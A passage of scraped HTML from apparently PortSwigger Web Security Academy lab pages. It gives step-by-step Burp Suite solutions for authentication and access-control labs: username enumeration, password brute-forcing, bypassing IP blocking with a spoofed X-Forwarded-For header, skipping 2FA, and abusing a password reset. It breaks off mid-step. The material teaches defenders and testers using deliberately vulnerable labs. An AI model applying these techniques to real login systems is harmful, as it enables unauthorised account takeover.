                To solve the lab, log in using the credentials
                <code>
   wiener:peter
  </code>
                and exploit the flawed
                <a href="https://portswigger.net/web-security/access-control">
                    access controls
                </a>
                to promote yourself to become an administrator.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/16e507638191c125691e9f9d752a1d42bf2e8fa811002b872ca607bd2cd8c334?referrer=%2fweb-security%2faccess-control%2flab-referer-based-access-control"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in using the admin credentials.
                                </li>
                                <li>
                                    Browse to the admin panel, promote
                                    <code>
        carlos
       </code>
                                    , and send the HTTP request to Burp Repeater.
                                </li>
                                <li>
                                    Open a private/incognito browser window, and log in with the non-admin credentials.
                                </li>
                                <li>
                                    Browse to
                                    <code>
        /admin-roles?username=carlos&amp;action=upgrade
       </code>
                                    and observe that the request is treated as unauthorized due to the absent Referer
                                    header.
                                </li>
                                <li>
                                    Copy the non-admin user's session cookie into the existing Burp Repeater request,
                                    change the username to yours, and replay it.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Username enumeration via different responses
                (authentication)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with
                a predictable username and password, which can be found in the following wordlists:
            </p>
            <ul>
                <li>
                    <a href="https://portswigger.net/web-security/authentication/auth-lab-usernames">
                        Candidate usernames
                    </a>
                </li>
                <li>
                    <a href="https://portswigger.net/web-security/authentication/auth-lab-passwords">
                        Candidate passwords
                    </a>
                </li>
            </ul>
            <p>
                To solve the lab, enumerate a valid username, brute-force this user's password, then access their
                account page.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/bb33e208e844c60faa4fe5876260053b536745d65312212a398ef5799fad29c8?referrer=%2fweb-security%2fauthentication%2fpassword-based%2flab-username-enumeration-via-different-responses"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, investigate the login page and submit an invalid username and
                                    password.
                                </li>
                                <li>
                                    In Burp, go to
                                    <strong>
                                        Proxy &gt; HTTP history
                                    </strong>
                                    and find the
                                    <code>
        POST /login
       </code>
                                    request. Highlight the value of the
                                    <code>
        username
       </code>
                                    parameter in the request and send it to Burp Intruder.
                                </li>
                                <li>
                                    In Burp Intruder, go to the
                                    <strong>
                                        Positions
                                    </strong>
                                    tab. Notice that the
                                    <code>
        username
       </code>
                                    parameter is automatically set as a payload position. This position is indicated by
                                    two
                                    <code>
        Â§
       </code>
                                    symbols, for example:
                                    <code>
        username=Â§invalid-usernameÂ§
       </code>
                                    . Leave the password as any static value for now.
                                </li>
                                <li>
                                    Make sure that the
                                    <strong>
                                        Sniper
                                    </strong>
                                    attack type is selected.
                                </li>
                                <li>
                                    On the
                                    <strong>
                                        Payloads
                                    </strong>
                                    tab, make sure that the
                                    <strong>
                                        Simple list
                                    </strong>
                                    payload type is selected.
                                </li>
                                <li>
                                    Under
                                    <strong>
                                        Payload settings
                                    </strong>
                                    , paste the list of candidate usernames. Finally, click
                                    <strong>
                                        Start attack
                                    </strong>
                                    . The attack will start in a new window.
                                </li>
                                <li>
                                    When the attack is finished, on the
                                    <strong>
                                        Results
                                    </strong>
                                    tab, examine the
                                    <strong>
                                        Length
                                    </strong>
                                    column. You can click on the column header to sort the results. Notice that one of
                                    the entries is longer than the others. Compare the response to this payload with the
                                    other responses. Notice that other responses contain the message
                                    <code>
        Invalid username
       </code>
                                    , but this response says
                                    <code>
        Incorrect password
       </code>
                                    . Make a note of the username in the
                                    <strong>
                                        Payload
                                    </strong>
                                    column.
                                </li>
                                <li>
                                    <p>
                                        Close the attack and go back to the
                                        <strong>
                                            Positions
                                        </strong>
                                        tab. Click
                                        <strong>
                                            Clear
                                        </strong>
                                        , then change the
                                        <code>
         username
        </code>
                                        parameter to the username you just identified. Add a payload position to the
                                        <code>
         password
        </code>
                                        parameter. The result should look something like this:
                                    </p>
                                    <code class="code-scrollable">
        username=identified-user&amp;password=Â§invalid-passwordÂ§
       </code>
                                </li>
                                <li>
                                    On the
                                    <strong>
                                        Payloads
                                    </strong>
                                    tab, clear the list of usernames and replace it with the list of candidate
                                    passwords. Click
                                    <strong>
                                        Start attack
                                    </strong>
                                    .
                                </li>
                                <li>
                                    When the attack is finished, look at the
                                    <strong>
                                        Status
                                    </strong>
                                    column. Notice that each request received a response with a
                                    <code>
        200
       </code>
                                    status code except for one, which got a
                                    <code>
        302
       </code>
                                    response. This suggests that the login attempt was successful - make a note of the
                                    password in the
                                    <strong>
                                        Payload
                                    </strong>
                                    column.
                                </li>
                                <li>
                                    <p>
                                        Log in using the username and password that you identified and access the user
                                        account page to solve the lab.
                                    </p>
                                    <div class="highlightedarea">
                                        <h4>
                                            Note
                                        </h4>
                                        <p>
                                            It's also possible to brute-force the login using a single cluster bomb
                                            attack. However, it's generally much more efficient to enumerate a valid
                                            username first if possible.
                                        </p>
                                    </div>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: 2FA simple bypass
                (authentication)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab's two-factor authentication can be bypassed. You have already obtained a valid username and
                password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's
                account page.
            </p>
            <ul>
                <li>
                    Your credentials:
                    <code>
    wiener:peter
   </code>
                </li>
                <li>
                    Victim's credentials
                    <code>
    carlos:montoya
   </code>
                </li>
            </ul>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/55a6f6d2de02362486d2c507f3191adb99fb573cd1583e7a69246d62445ed703?referrer=%2fweb-security%2fauthentication%2fmulti-factor%2flab-2fa-simple-bypass"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in to your own account. Your 2FA verification code will be sent to you by email.
                                    Click the
                                    <strong>
                                        Email client
                                    </strong>
                                    button to access your emails.
                                </li>
                                <li>
                                    Go to your account page and make a note of the URL.
                                </li>
                                <li>
                                    Log out of your account.
                                </li>
                                <li>
                                    Log in using the victim's credentials.
                                </li>
                                <li>
                                    When prompted for the verification code, manually change the URL to navigate to
                                    <code>
        /my-account
       </code>
                                    . The lab is solved when the page loads.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Password reset broken logic
                (authentication)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then
                log in and access his "My account" page.
            </p>
            <ul>
                <li>
                    Your credentials:
                    <code>
    wiener:peter
   </code>
                </li>
                <li>
                    Victim's username:
                    <code>
    carlos
   </code>
                </li>
            </ul>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/a2aa25c63138601f68030a53721c7e4e4f97843ee4d4fff8c485bce7f03ea087?referrer=%2fweb-security%2fauthentication%2fother-mechanisms%2flab-password-reset-broken-logic"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, click the
                                    <strong>
                                        Forgot your password?
                                    </strong>
                                    link and enter your own username.
                                </li>
                                <li>
                                    Click the
                                    <strong>
                                        Email client
                                    </strong>
                                    button to view the password reset email that was sent. Click the link in the email
                                    and reset your password to whatever you want.
                                </li>
                                <li>
                                    In Burp, go to
                                    <strong>
                                        Proxy &gt; HTTP history
                                    </strong>
                                    and study the requests and responses for the password reset functionality. Observe
                                    that the reset token is provided as a URL query parameter in the reset email. Notice
                                    that when you submit your new password, the
                                    <code>
        POST /forgot-password?temp-forgot-password-token
       </code>
                                    request contains the username as hidden input. Send this request to Burp Repeater.
                                </li>
                                <li>
                                    In Burp Repeater, observe that the password reset functionality still works even if
                                    you delete the value of the
                                    <code>
        temp-forgot-password-token
       </code>
                                    parameter in both the URL and request body. This confirms that the token is not
                                    being checked when you submit the new password.
                                </li>
                                <li>
                                    In the browser, request a new password reset and change your password again. Send
                                    the
                                    <code>
        POST /forgot-password?temp-forgot-password-token
       </code>
                                    request to Burp Repeater again.
                                </li>
                                <li>
                                    In Burp Repeater, delete the value of the
                                    <code>
        temp-forgot-password-token
       </code>
                                    parameter in both the URL and request body. Change the
                                    <code>
        username
       </code>
                                    parameter to
                                    <code>
        carlos
       </code>
                                    . Set the new password to whatever you want and send the request.
                                </li>
                                <li>
                                    In the browser, log in to Carlos's account using the new password you just set.
                                    Click
                                    <strong>
                                        My account
                                    </strong>
                                    to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Username enumeration via subtly different responses
                (authentication)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an
                account with a predictable username and password, which can be found in the following wordlists:
            </p>
            <ul>
                <li>
                    <a href="https://portswigger.net/web-security/authentication/auth-lab-usernames">
                        Candidate usernames
                    </a>
                </li>
                <li>
                    <a href="https://portswigger.net/web-security/authentication/auth-lab-passwords">
                        Candidate passwords
                    </a>
                </li>
            </ul>
            <p>
                To solve the lab, enumerate a valid username, brute-force this user's password, then access their
                account page.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/4eacbb457e9ae79cc134bd8a335d37d42545fa6aa7306ff2f1d68b2cd9a1fe0d?referrer=%2fweb-security%2fauthentication%2fpassword-based%2flab-username-enumeration-via-subtly-different-responses"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, submit an invalid username and password. Highlight the
                                    <code>
        username
       </code>
                                    parameter in the
                                    <code>
        POST /login
       </code>
                                    request and send it to Burp Intruder.
                                </li>
                                <li>
                                    On the
                                    <strong>
                                        Payloads
                                    </strong>
                                    tab, notice that the
                                    <code>
        username
       </code>
                                    parameter is automatically marked as a payload position. Make sure that the
                                    <strong>
                                        Simple list
                                    </strong>
                                    payload type is selected and add the list of candidate usernames.
                                </li>
                                <li>
                                    On the
                                    <strong>
                                        Settings
                                    </strong>
                                    tab, under
                                    <strong>
                                        Grep - Extract
                                    </strong>
                                    , click
                                    <strong>
                                        Add
                                    </strong>
                                    . In the dialog that appears, scroll down through the response until you find the
                                    error message
                                    <code>
        Invalid username or password.
       </code>
                                    . Use the mouse to highlight the text content of the message. The other settings
                                    will be automatically adjusted. Click
                                    <strong>
                                        OK
                                    </strong>
                                    and then start the attack.
                                </li>
                                <li>
                                    When the attack is finished, notice that there is an additional column containing
                                    the error message you extracted. Sort the results using this column to notice that
                                    one of them is subtly different.
                                </li>
                                <li>
                                    Look closer at this response and notice that it contains a typo in the error message
                                    - instead of a full stop/period, there is a trailing space. Make a note of this
                                    username.
                                </li>
                                <li>
                                    <p>
                                        Close the attack and go back to the
                                        <strong>
                                            Positions
                                        </strong>
                                        tab. Insert the username you just identified and add a payload position to the
                                        <code>
         password
        </code>
                                        parameter:
                                    </p>
                                    <code class="code-scrollable">
        username=identified-user&amp;password=Â§invalid-passwordÂ§
       </code>
                                </li>
                                <li>
                                    On the
                                    <strong>
                                        Payloads
                                    </strong>
                                    tab, clear the list of usernames and replace it with the list of passwords. Start
                                    the attack.
                                </li>
                                <li>
                                    When the attack is finished, notice that one of the requests received a
                                    <code>
        302
       </code>
                                    response. Make a note of this password.
                                </li>
                                <li>
                                    <p>
                                        Log in using the username and password that you identified and access the user
                                        account page to solve the lab.
                                    </p>
                                    <div class="highlightedarea">
                                        <h4>
                                            Note
                                        </h4>
                                        <p>
                                            It's also possible to brute-force the login using a single cluster bomb
                                            attack. However, it's generally much more efficient to enumerate a valid
                                            username first if possible.
                                        </p>
                                    </div>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Username enumeration via response timing
                (authentication)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a
                valid username, brute-force this user's password, then access their account page.
            </p>
            <ul>
                <li>
                    Your credentials:
                    <code>
    wiener:peter
   </code>
                </li>
                <li>
                    <a href="https://portswigger.net/web-security/authentication/auth-lab-usernames">
                        Candidate usernames
                    </a>
                </li>
                <li>
                    <a href="https://portswigger.net/web-security/authentication/auth-lab-passwords">
                        Candidate passwords
                    </a>
                </li>
            </ul>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                To add to the challenge, the lab also implements a form of IP-based brute-force
                                protection. However, this can be easily bypassed by manipulating HTTP request headers.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/aac0059c54f24f1874ac6c39b2fa9f7b5e0d5ab84ad797d4ca300275cf14c842?referrer=%2fweb-security%2fauthentication%2fpassword-based%2flab-username-enumeration-via-response-timing"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, submit an invalid username and password, then send the
                                    <code>
        POST /login
       </code>
                                    request to Burp Repeater. Experiment with different usernames and passwords. Notice
                                    that your IP will be blocked if you make too many invalid login attempts.
                                </li>
                                <li>
                                    Identify that the
                                    <code>
        X-Forwarded-For
       </code>
                                    header is supported, which allows you to spoof your IP address and bypass the
                                    IP-based brute-force protection.
                                </li>
                                <li>
                                    Continue experimenting with usernames and passwords. Pay particular attention to the
                                    response times. Notice that when the username is invalid, the response time is
                                    roughly the same. However, when you enter a valid username (your own), the response
                                    time is increased depending on the length of the password you entered.
                                </li>
                                <li>
                                    Send this request to Burp Intruder and select the attack type to
                                    <strong>
                                        Pitchfork
                                    </strong>
                                    . Add the
                                    <code>
        X-Forwarded-For
       </code>
                                    header.
                                </li>
                                <li>
                                    Add payload positions for the
                                    <code>
        X-Forwarded-For
       </code>
                                    header and the
                                    <code>
        username
       </code>
                                    parameter. Set the password to a very long string of characters (about 100
                                    characters should do it).
                                </li>
                                <li>
                                    On the
                                    <strong>
                                        Payloads
                                    </strong>
                                    tab, select payload set 1. Select the
                                    <strong>
                                        Numbers
                                    </strong>
                                    payload type. Enter the range 1 - 100 and set the step to 1. Set the max fraction
                                    digits to 0. This will be used to spoof your IP.
                                </li>
                                <li>
                                    Select payload set 2 and add the list of usernames. Start the attack.
                                </li>
                                <li>
                                    When the attack finishes, at the top of the dialog, click
                                    <strong>
                                        Columns
                                    </strong>
                                    and select the
                                    <strong>
                                        Response received
                                    </strong>
                                    and
                                    <strong>
                                        Response completed
                                    </strong>
                                    options. These two columns are now displayed in the results table.
                                </li>
                                <li>
                                    Notice that one of the response times was significantly longer than the others.
                                    Repeat this request a few times to make sure it consistently takes longer, then make
                                    a note of this username.
                                </li>
                                <li>
                                    Create a new Burp Intruder attack for the same request. Add the
                                    <code>
        X-Forwarded-For
       </code>
                                    header again and add a payload position to it. Insert the username that you just
                                    identified and add a payload position to the
                                    <code>
        password
       </code>
                                    parameter.
                                </li>
                                <li>
                                    On the
                                    <strong>
                                        Payloads
                                    </strong>
                                    tab, add the list of numbers in payload set 1 and add the list of passwords to
                                    payload set 2. Start the attack.
                                </li>
                                <li>
                                    When the attack is finished, find the response with a
                                    <code>
        302
       </code>
                                    status. Make a note of this password.
                                </li>
                                <li>
                                    <p>
                                        Log in using the username and password that you identified and access the user
                                        account page to solve the lab.
                                    </p>
                                    <div class="highlightedarea">
                                        <h4>
                                            Note
                                        </h4>
                                        <p>
                                            It's also possible to brute-force the login using a single cluster bomb
                                            attack. However, it's generally much more efficient to enumerate a valid
                                            username first if possible.
                                        </p>
                                    </div>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Broken brute-force protection, IP block
                (authentication)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab,
                brute-force the victim's password, then log in and access their account page.
            </p>
            <ul>
                <li>
                    Your credentials:
                    <code>
    wiener:peter
   </code>
                </li>
                <li>
                    Victim's username:
                    <code>
    carlos
   </code>
                </li>
                <li>
                    <a href="https://portswigger.net/web-security/authentication/auth-lab-passwords">
                        Candidate passwords
                    </a>
                </li>
            </ul>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                Advanced users may want to solve this lab by using a macro or the Turbo Intruder
                                extension. However, it is possible to solve the lab without using these advanced
                                features.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/6d4cc1c44751ee06710496ea067aa78c8b2cb01e7686737e13a7e88261d1471a?referrer=%2fweb-security%2fauthentication%2fpassword-based%2flab-broken-bruteforce-protection-ip-block"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, investigate the login page. Observe that your IP is temporarily
                                    blocked if you submit 3 incorrect logins in a row. However, notice that you can
                                    reset the counter for the number of failed login attempts by logging in to your own
                                    account before this limit is reached.
                                </li>
                                <li>
                                    Enter an invalid username and password, then send the
                                    <code>
        POST /login
       </code>
                                    request to Burp Intruder. Create a pitchfork attack with payload positions in both
                                    the
                                    <code>
        username
       </code>
                                    and
                                    <code>
        password
       </code>
                                    parameters.
                                </li>
                                <li>
                                    On the
                                    <strong>
                                        Resource pool
                                    </strong>
                                    tab, add the attack to a resource pool with
                                    <strong>
                                        Maximum concurrent requests
                                    </strong>
                                    set to
                                    <code>
        1
       </code>
                                    . By only sending one request at a time, you can ensure that your login attempts are
                                    sent to the server in the correct order.
                                </li>
                                <li>
                                    On the
                                    <strong>
                                        Payloads
                                    </strong>
                                    tab, select payload set 1. Add a list of payloads that alternates between your
                                    username and
                                    <code>
        carlos
       </code>
                                    . Make sure that your username is first and that
                                    <code>
        carlos
       </code>
                                    is repeated at least 100 times.
                                </li>
                                <li>
                                    Edit the list of candidate passwords and add your own password before each one. Make
                                    sure that your password is aligned with your username in the other list.
                                </li>
                                <li>
                                    Add this list to payload set 2 and start the attack.
                                </li>
                                <li>
                                    When the attack finishes, filter the results to hide responses with a 200 status
                                    code. Sort the remaining results by username. There should only be a single 302
                                    response for requests with the username
                                    <code>
        carlos
       </code>
                                    . Make a note of the password from the
                                    <strong>
                                        Payload 2
                                    </strong>
                                    column.
                                </li>
                                <li>
                                    Log in to Carlos's account using the password that you identified and access his
                                    account page to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Username enumeration via account lock
                (authentication)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw.
                To solve the lab, enumerate a valid username, brute-force this user's password, then access their
                account page.
            </p>
            <ul>
                <li>
                    <a href="https://portswigger.net/web-security/authentication/auth-lab-usernames">
                        Candidate usernames
                    </a>
                </li>
                <li>
                    <a href="https://portswigger.net/web-security/authentication/auth-lab-passwords">
                        Candidate passwords
                    </a>
                </li>
            </ul>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/4b100811651a2caccd08e1ee3d2a1c92a26c52cfc3d73f7ee773282373d39d3c?referrer=%2fweb-security%2fauthentication%2fpassword-based%2flab-username-enumeration-via-account-lock"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, investigate the login page and submit an invalid username and
                                    password. Send the
                                    <code>
        POST /login
       </code>
                                    request to Burp Intruder.
                                </li>
                                <li>
                                    <p>
                                        Select the attack type
                                        <strong>
                                            Cluster bomb
                                        </strong>
                                        . Add a payload position to the
                                        <code>
         username
        </code>
                                        parameter. Add a blank payload position to the end of the request body by
                                        clicking
                                        <strong>
                                            Add Â§
                                        </strong>
                                        twice. The result should look something like this:
                                    </p>
                                    <code class="code-scrollable">
        username=Â§invalid-usernameÂ§&amp;password=exampleÂ§Â§
       </code>
                                </li>
                                <li>
                                    On the
                                    <strong>
                                        Payloads
                                    </strong>
                                    tab, add the list of usernames to the first payload set. For the second set, select
                                    the
                                    <strong>
                                        Null payloads
                                    </strong>
                                    type and choose the option to generate 5 payloads. This will effectively cause each
                                    username to be repeated 5 times. Start the attack.
                                </li>
                                <li>
                                    In the results, notice that the responses for one of the usernames were longer than
                                    responses when using other usernames. Study the response more closely and notice
                                    that it contains a different error message:
                                    <code>
        You have made too many incorrect login attempts.
       </code>
                                    Make a note of this username.
                                </li>
                                <li>
                                    Create a new Burp Intruder attack on the
                                    <code>
        POST /login
       </code>
                                    request, but this time select the
                                    <strong>
                                        Sniper
                                    </strong>
                                    attack type. Set the
                                    <code>
        username
       </code>
                                    parameter to the username that you just identified and add a payload position to the
                                    <code>
        password
       </code>
                                    parameter.
                                </li>
                                <li>
                                    Add the list of passwords to the payload set and create a grep extraction rule for
                                    the error message. Start the attack.
                                </li>
                                <li>
                                    In the results, look at the grep extract column. Notice that there are a couple of
                                    different error messages, but one of the responses did not contain any error
                                    message. Make a note of this password.
                                </li>
                                <li>
                                    Wait for a minute to allow the account lock to reset. Log in using the username and
                                    password that you identified and access the user account page to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: 2FA broken logic
                (authentication)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access
                Carlos's account page.
            </p>
            <ul>
                <li>
                    Your credentials:
                    <code>
    wiener:peter
   </code>
                </li>
                <li>
                    Victim's username:
                    <code>
    carlos
   </code>
                </li>
            </ul>
            <p>
                You also have access to the email server to receive your 2FA verification code.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                Carlos will not attempt to log in to the website himself.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/ce4838d79961e13680ebec4ec6b7f31fb30b57ff632815e0712c399f5d054b82?referrer=%2fweb-security%2fauthentication%2fmulti-factor%2flab-2fa-broken-logic"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, log in to your own account and investigate the 2FA verification
                                    process. Notice that in the
                                    <code>
        POST /login2
       </code>
                                    request, the
                                    <code>
        verify
       </code>
                                    parameter is used to determine which user's account is being accessed.
                                </li>
                                <li>
                                    Log out of your account.
                                </li>
                                <li>
                                    Send the
                                    <code>
        GET /login2
       </code>
                                    request to Burp Repeater. Change the value of the
                                    <code>
        verify
       </code>
                                    parameter to
                                    <code>
        carlos
       </code>
                                    and send the request. This ensures that a temporary 2FA code is generated for
                                    Carlos.
                                </li>
                                <li>
                                    Go to the login page and enter your username and password. Then, submit an invalid
                                    2FA code.
                                </li>
                                <li>
                                    Send the
                                    <code>
        POST /login2
       </code>
                                    request to Burp Intruder.
                                </li>
                                <li>
                                    In Burp Intruder, set the
                                    <code>
        verify
       </code>
                                    parameter to
                                    <code>
        carlos
       </code>
                                    and add a payload position to the
                                    <code>
        mfa-code
       </code>
                                    parameter. Brute-force the verification code.
                                </li>
                                <li>
                                    Load the 302 response in the browser.
                                </li>
                                <li>
                                    Click
                                    <strong>
                                        My account
                                    </strong>
                                    to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Brute-forcing a stay-logged-in cookie
                (authentication)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab allows users to stay logged in even after they close their browser session. The cookie used to
                provide this functionality is vulnerable to brute-forcing.
            </p>
            <p>
                To solve the lab, brute-force Carlos's cookie to gain access to his "My account" page.
            </p>
            <ul>
                <li>
                    Your credentials:
                    <code>
    wiener:peter
   </code>
                </li>
                <li>
                    Victim's username:
                    <code>
    carlos
   </code>
                </li>
                <li>
                    <a href="https://portswigger.net/web-security/authentication/auth-lab-passwords">
                        Candidate passwords
                    </a>
                </li>
            </ul>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/2f93ccbfee70335f0c3f0cc709c7f5b943c3facc47e44078dc736744c336d304?referrer=%2fweb-security%2fauthentication%2fother-mechanisms%2flab-brute-forcing-a-stay-logged-in-cookie"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, log in to your own account with the
                                    <strong>
                                        Stay logged in
                                    </strong>
